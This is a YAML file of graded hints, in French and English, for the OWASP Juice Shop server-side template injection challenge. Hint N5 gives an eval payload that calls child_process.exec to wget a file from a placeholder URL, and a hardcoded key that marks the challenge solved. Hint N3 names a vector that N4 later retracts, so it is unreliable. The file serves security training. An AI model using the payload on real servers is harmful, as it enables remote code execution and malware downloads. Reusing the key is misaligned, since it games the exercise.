challenge_key: "sstiChallenge"
schema_version: "juicelab.hints.v2"

hints:
  N1:
    cost_pct: 5
    text_fr: |
      Le hint OWASP officiel #1 a deux infos critiques. (1) "SSTi is
      a clear indicator that this has nothing to do with anything
      Angular" — donc pas le frontend, pas une XSS. (2) "make sure
      to use only our non-malicious malware". Tu as donc deux
      sous-problemes : (a) trouver l'endpoint serveur vulnerable a
      SSTI, (b) trouver le malware approuve par OWASP.
    text_en: |
      Official OWASP hint #1 has two critical pieces. (1) "SSTi
      is a clear indicator that this has nothing to do with
      anything Angular" — so not the frontend, not an XSS. (2)
      "make sure to use only our non-malicious malware". You
      therefore have two sub-problems: (a) find the server
      endpoint vulnerable to SSTI, (b) find the malware approved
      by OWASP.
    pedagogical_intent: |
      Decompose the challenge into two sub-problems.

  N2:
    cost_pct: 10
    text_fr: |
      Pour le malware (sub-probleme b), hint OWASP officiel #2 :
      "very obvious Google search or by stumbling into a very
      ill-placed quarantine folder". Cherche dans le bundle
      backend ou dans les dossiers exposes du serveur Juice Shop
      un fichier nomme avec une extension peu commune. Indice :
      ".efb" est l'extension du malware fictif officiel OWASP
      Juice Shop, le fichier s'appelle juicy.efb.
    text_en: |
      For the malware (sub-problem b), official OWASP hint #2:
      "very obvious Google search or by stumbling into a very
      ill-placed quarantine folder". Look in the backend bundle
      or in exposed server folders of Juice Shop for a file with
      an uncommon extension. Hint: ".efb" is the official OWASP
      Juice Shop fictitious malware extension, file name
      juicy.efb.
    pedagogical_intent: |
      Pin down the malware identity.

  N3:
    cost_pct: 20
    text_fr: |
      Pour l'endpoint vulnerable (sub-probleme a) : Juice Shop a
      une feature de processing de commandes B2B sous /b2b/v2/
      orders. Cette feature accepte un body JSON et passe certains
      champs a un template engine cote serveur (vm.runInNewContext
      Node.js). Hint OWASP #3 : "Making the server download and
      execute the malware is key to solving this challenge". Quel
      payload force le serveur a faire un download HTTP ?
    text_en: |
      For the vulnerable endpoint (sub-problem a): Juice Shop has
      a B2B order processing feature under /b2b/v2/orders. This
      feature takes a JSON body and passes certain fields to a
      server-side template engine (vm.runInNewContext Node.js).
      OWASP hint #3: "Making the server download and execute the
      malware is key to solving this challenge". Which payload
      forces the server to perform an HTTP download?
    pedagogical_intent: |
      Localize the SSTI surface and connect to the malware-fetch goal.

  N4:
    cost_pct: 35
    text_fr: |
      Le point d'injection n'est pas /b2b/v2/orders : c'est le champ
      username de ton profil. A l'affichage de /profile
      (routes/userProfile.ts), si le username contient la syntaxe
      #{...}, le serveur en extrait le contenu et l'EVALUE
      (eval(code)). C'est une execution de code arbitraire cote
      serveur. Y placer un require('child_process') permet de lancer
      une commande systeme.
    text_en: |
      The injection point is not /b2b/v2/orders: it is your profile's
      username field. When /profile renders (routes/userProfile.ts), if
      the username contains the #{...} syntax, the server extracts its
      content and EVALUATES it (eval(code)). This is arbitrary server-
      side code execution. Placing a require('child_process') there
      lets you run a system command.
    pedagogical_intent: |
      Correct the vector: SSTI via the profile username eval, not b2b.

  N5:
    cost_pct: 50
    text_fr: |
      Marche a suivre (vecteur confirme dans le code ; la chaine
      complete de telechargement du malware n'a pas ete rejouee pour ne
      pas executer de commande) :
      1. Mets ton username (PUT /api/Users/<ton_id>) a une expression
         #{...} qui telecharge le fichier attendu, par ex.
         #{global.process.mainModule.require('child_process').exec('wget <url>/juicy.efb -O ...')}
      2. Ouvre /profile : le serveur evalue le code, la commande
         s'execute et positionne le drapeau abused_ssti_bug.
      3. Declenche la validation :
         GET /solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3
         -> le serveur resout le challenge (verify.ts:93).
      Defense : ne JAMAIS passer une entree utilisateur a eval ou a un
      moteur de template cote serveur ; echapper/valider le username et
      supprimer toute evaluation dynamique.
    text_en: |
      Procedure (vector confirmed in the code; the full malware-
      download chain was not replayed to avoid running a command):
      1. Set your username (PUT /api/Users/<your_id>) to a #{...}
         expression that downloads the expected file, e.g.
         #{global.process.mainModule.require('child_process').exec('wget <url>/juicy.efb -O ...')}
      2. Open /profile: the server evaluates the code, the command runs
         and sets the abused_ssti_bug flag.
      3. Trigger validation:
         GET /solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3
         -> the server solves the challenge (verify.ts:93).
      Defense: NEVER pass user input to eval or a server-side template
      engine; escape/validate the username and remove any dynamic
      evaluation.
    pedagogical_intent: |
      Full chain with the correct vector, honest replay status, defense.
